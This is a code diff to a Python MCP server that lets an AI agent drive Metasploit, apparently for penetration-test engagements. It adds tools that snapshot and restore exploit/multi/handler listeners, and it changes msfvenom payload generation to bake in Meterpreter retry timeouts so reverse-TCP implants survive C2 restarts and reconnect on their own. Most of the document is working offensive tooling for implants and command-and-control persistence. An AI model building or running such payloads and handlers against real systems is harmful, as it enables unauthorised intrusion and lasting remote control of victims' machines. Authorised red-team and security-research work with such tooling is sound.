@@ -195,6 +195,7 @@ def _log_session_io(session_id: str, command: str, output: str) -> None:
 # monotonic in-process counter; the actual filename is seeded with the current
 # time once at startup so IDs across restarts don't collide on disk.
 _MODULE_LOG_DIR = _PROJECT_ROOT / "engagement" / "evidence" / "msf-modules"
+_HANDLERS_SNAPSHOT = _PROJECT_ROOT / "engagement" / "msf-handlers-snapshot.json"
 _module_call_lock = threading.Lock()
 _module_call_seq = [int(time.time())]
 
@@ -516,6 +517,219 @@ def create_server() -> FastMCP:
         except Exception as e:
             return f"ERROR: {e}"
 
+    # ── Handler snapshot + restore ──────────────────────────────────
+    # Metasploit sessions themselves cannot survive a Framework restart (the
+    # sockets live in the dying process), but the HANDLERS that catch them
+    # can — and payloads built by generate_payload have retry attributes
+    # baked in by default, so if we re-register matching handlers within the
+    # SessionCommunicationTimeout window, Meterpreter sessions reconnect
+    # automatically. These two tools make that pipeline operator-free.
+
+    def _handler_params_from_log() -> dict[str, dict]:
+        """Walk engagement/evidence/msf-modules/*.jsonl and return the most
+        recent `start_handler` call keyed by job_id. Each record carries
+        exactly PAYLOAD/LHOST/LPORT/ExitOnSession — enough to re-register.
+        """
+        out: dict[str, dict] = {}
+        if not _MODULE_LOG_DIR.exists():
+            return out
+        # Walk oldest-first so later calls overwrite earlier ones for the
+        # same job_id (the current live handler's config wins).
+        try:
+            files = sorted(
+                _MODULE_LOG_DIR.glob("*.jsonl"),
+                key=lambda p: int(p.name.split("-", 1)[0]) if p.name.split("-", 1)[0].isdigit() else 0,
+            )
+        except OSError:
+            return out
+        for p in files:
+            try:
+                for line in p.read_text(errors="replace").splitlines():
+                    line = line.strip()
+                    if not line:
+                        continue
+                    rec = json.loads(line)
+                    if rec.get("tool") != "start_handler":
+                        continue
+                    jid = rec.get("job_id")
+                    if jid is None:
+                        continue
+                    opts = rec.get("options") or {}
+                    payload = opts.get("PAYLOAD")
+                    lhost = opts.get("LHOST")
+                    lport = opts.get("LPORT")
+                    if not (payload and lhost and lport):
+                        continue
+                    out[str(jid)] = {
+                        "payload": str(payload),
+                        "lhost": str(lhost),
+                        "lport": int(lport),
+                        "exit_on_session": bool(opts.get("ExitOnSession", False)),
+                        "call_id": rec.get("call_id"),
+                    }
+            except (OSError, json.JSONDecodeError):
+                continue
+        return out
+
+    @mcp.tool()
+    @_serialized
+    def snapshot_handlers() -> str:
+        """Snapshot every live exploit/multi/handler to disk for later restore.
+
+        Writes `engagement/msf-handlers-snapshot.json` with one entry per
+        live handler job (payload, LHOST, LPORT, exit_on_session). Call this
+        BEFORE killing msfconsole — restore_handlers() on the new instance
+        re-registers all of them, and Meterpreter payloads built by
+        generate_payload (with the default retry attributes) will reconnect
+        on their own.
+
+        Reconstructs the config from the module-call log
+        (engagement/evidence/msf-modules/) because msfrpcd's list_jobs only
+        returns {job_id, name} — the handler's actual payload/LHOST/LPORT
+        aren't recoverable from the live Framework state.
+
+        No-op (returns empty snapshot) when nothing's running or no log exists.
+        """
+        client, err = _require_client()
+        if err:
+            return err
+        try:
+            live = {str(jid): name for jid, name in client.jobs.list.items()}
+        except Exception as e:
+            return f"ERROR: list_jobs failed: {e}"
+
+        handler_jobs = {jid: name for jid, name in live.items()
+                        if "multi/handler" in str(name).lower()
+                        or "exploit/multi/handler" in str(name).lower()}
+        params_by_jid = _handler_params_from_log()
+        snapshot = []
+        unresolved = []
+        for jid, name in handler_jobs.items():
+            if jid in params_by_jid:
+                p = params_by_jid[jid]
+                snapshot.append({"job_id": jid, "name": name, **p})
+            else:
+                # Handler is live but we have no module-call-log record of its
+                # setup (older than the logging feature, or set up via
+                # console_exec instead of start_handler). Record it so the
+                # operator knows what was lost, but we can't auto-restore it.
+                unresolved.append({"job_id": jid, "name": name})
+
+        try:
+            _HANDLERS_SNAPSHOT.parent.mkdir(parents=True, exist_ok=True)
+            payload = {
+                "ts": datetime.now(tz=timezone.utc).isoformat(timespec="seconds"),
+                "handlers": snapshot,
+                "unresolved": unresolved,
+            }
+            _HANDLERS_SNAPSHOT.write_text(json.dumps(payload, indent=2))
+        except OSError as e:
+            return f"ERROR: couldn't write snapshot: {e}"
+        return json.dumps({
+            "status": "snapshotted",
+            "path": str(_HANDLERS_SNAPSHOT),
+            "handlers": len(snapshot),
+            "unresolved": len(unresolved),
+        })
+
+    @mcp.tool()
+    @_serialized
+    def restore_handlers() -> str:
+        """Re-register handlers from the snapshot file onto the current MSF.
+
+        Reads engagement/msf-handlers-snapshot.json (written by
+        snapshot_handlers) and starts an exploit/multi/handler for each entry
+        via the usual start_handler path. Idempotent: skips any entry whose
+        (payload, lhost, lport) is already running as a live handler.
+
+        Payloads built by generate_payload have retry attributes baked in by
+        default (SessionCommunicationTimeout=600, SessionExpirationTimeout=
+        86400); if the restart cycle completes within those windows, their
+        Meterpreter sessions reconnect to the restored handler automatically.
+        Raw shells and payloads built with no_retry=True do NOT reconnect —
+        those are reported in the result for operator follow-up.
+        """
+        if not _HANDLERS_SNAPSHOT.exists():
+            return json.dumps({
+                "status": "no_snapshot",
+                "message": f"{_HANDLERS_SNAPSHOT} not found — call snapshot_handlers() before killing msfconsole.",
+            })
+        try:
+            snap = json.loads(_HANDLERS_SNAPSHOT.read_text())
+        except (OSError, json.JSONDecodeError) as e:
+            return f"ERROR: couldn't read snapshot: {e}"
+
+        client, err = _require_client()
+        if err:
+            return err
+
+        # Build a (payload, lhost, lport) set of currently-live handlers so we
+        # don't double-register. We reconstruct these from the same module-log
+        # path snapshot_handlers used — list_jobs itself doesn't expose them.
+        try:
+            live_jobs = {str(j) for j in client.jobs.list.keys()}
+        except Exception as e:
+            return f"ERROR: list_jobs failed: {e}"
+        live_params = _handler_params_from_log()
+        live_keys = {
+            (v["payload"], v["lhost"], int(v["lport"]))
+            for jid, v in live_params.items() if jid in live_jobs
+        }
+
+        restored, skipped, failed = [], [], []
+        for h in snap.get("handlers", []):
+            key = (h.get("payload"), h.get("lhost"), int(h.get("lport", 0)))
+            if key in live_keys:
+                skipped.append({**h, "reason": "already_live"})
+                continue
+            # Re-register via the same module path start_handler uses. Inline
+            # here (rather than calling start_handler) because we're already
+            # inside _rpc_lock and start_handler would try to grab it again.
+            try:
+                mod = client.modules.use("exploit", "multi/handler")
+                pay = client.modules.use("payload", h["payload"])
+                pay["LHOST"] = h["lhost"]
+                pay["LPORT"] = int(h["lport"])
+                try:
+                    if "AutoLoadExtensions" in getattr(pay, "options", []):
+                        pay["AutoLoadExtensions"] = True
+                except Exception:
+                    pass
+                mod["ExitOnSession"] = bool(h.get("exit_on_session", False))
+                result = mod.execute(payload=pay)
+                err_msg = _execute_error(result, expect_job=True)
+                if err_msg:
+                    failed.append({**h, "error": err_msg})
+                else:
+                    new_jid = result.get("job_id")
+                    restored.append({**h, "new_job_id": new_jid})
+                    _log_module_call(
+                        tool="restore_handlers",
+                        module="exploit/multi/handler",
+                        module_type="exploit",
+                        options={"PAYLOAD": h["payload"], "LHOST": h["lhost"],
+                                 "LPORT": int(h["lport"]),
+                                 "ExitOnSession": bool(h.get("exit_on_session", False))},
+                        result=result,
+                        job_id=new_jid,
+                        extra={"restored_from_call_id": h.get("call_id")},
+                    )
+            except Exception as e:
+                failed.append({**h, "error": str(e)})
+
+        return json.dumps({
+            "status": "restored",
+            "restored": restored,
+            "skipped": skipped,
+            "failed": failed,
+            "unresolved_from_snapshot": snap.get("unresolved", []),
+            "hint": (
+                "Payloads built by generate_payload (retry defaults) reconnect "
+                "within SessionCommunicationTimeout. Raw shells and no_retry "
+                "payloads need re-triggering on target."
+            ),
+        })
+
     @mcp.tool()
     @_serialized
     def kill_job(job_id: str = "") -> str:
@@ -545,8 +759,18 @@ def create_server() -> FastMCP:
         format: str = "elf",
         name: str = "",
         extra_options: str = "",
+        no_retry: bool = False,
     ) -> str:
         """Generate a payload with msfvenom, saved to engagement/evidence/.
+
+        By default this bakes in transport-retry attributes so the implant
+        survives a brief C2 outage (msfconsole restart, handler re-register):
+        `SessionCommunicationTimeout=600` and `SessionExpirationTimeout=86400`.
+        If the operator calls restore_handlers() after a restart within the
+        communication-timeout window, the Meterpreter session reconnects to
+        the new handler on the same LHOST:LPORT — no re-trigger on target.
+        The payload binary is a few hundred bytes larger with these set; raw
+        shells don't honor them (they have no transport layer).
 
         Args:
             payload: Payload name, e.g. "windows/x64/meterpreter/reverse_tcp".
@@ -556,16 +780,38 @@ def create_server() -> FastMCP:
             format: Output format — elf, exe, raw, dll, psh, python, war, etc.
             name: Optional output filename (without path).
             extra_options: Extra "KEY=VALUE KEY=VALUE" msfvenom datastore options
-                           (e.g. "EXITFUNC=thread RC4PASSWORD=foo").
+                           (e.g. "EXITFUNC=thread RC4PASSWORD=foo"). Operator-
+                           supplied Session*Timeout keys here override the
+                           retry defaults — set them to 0 to opt out
+                           per-payload, or pass no_retry=True to drop all
+                           retry attributes.
+            no_retry: Opt out of the baked-in retry attributes for this one
+                     payload (minimum-size build; implant will NOT survive a
+                     C2 restart).
         """
         if not payload or not lhost:
             return "ERROR: payload and lhost are required."
         msfvenom = shutil.which("msfvenom")
         if not msfvenom:
             return "ERROR: msfvenom not found in PATH (install metasploit-framework)."
+
+        # Bake in the retry defaults unless the operator opted out or supplied
+        # the keys themselves. Parse operator extra_options into a dict first so
+        # we don't duplicate keys (msfvenom takes the last one but it's noisy).
+        extra_opts_tokens = extra_options.split()
+        extra_keys_present = {t.split("=", 1)[0].lower() for t in extra_opts_tokens if "=" in t}
+        if not no_retry:
+            # Meterpreter payloads honor these; raw shells silently ignore.
+            # Values picked for "survive a ~minute of restart work without
+            # keeping the implant idle so long the box reboots on us."
+            if "sessioncommunicationtimeout" not in extra_keys_present:
+                extra_opts_tokens.append("SessionCommunicationTimeout=600")
+            if "sessionexpirationtimeout" not in extra_keys_present:
+                extra_opts_tokens.append("SessionExpirationTimeout=86400")
+
         try:
             validate_module_name(payload)
-            for token in [lhost, str(lport), format, *extra_options.split()]:
+            for token in [lhost, str(lport), format, *extra_opts_tokens]:
                 validate_option_value(token)
         except ValidationError as e:
             return f"ERROR: {e}"
@@ -582,7 +828,7 @@ def create_server() -> FastMCP:
             f"LHOST={lhost}", f"LPORT={int(lport)}",
             "-f", format, "-o", str(filepath),
         ]
-        for opt in extra_options.split():
+        for opt in extra_opts_tokens:
             cmd.append(opt)
 
         try:
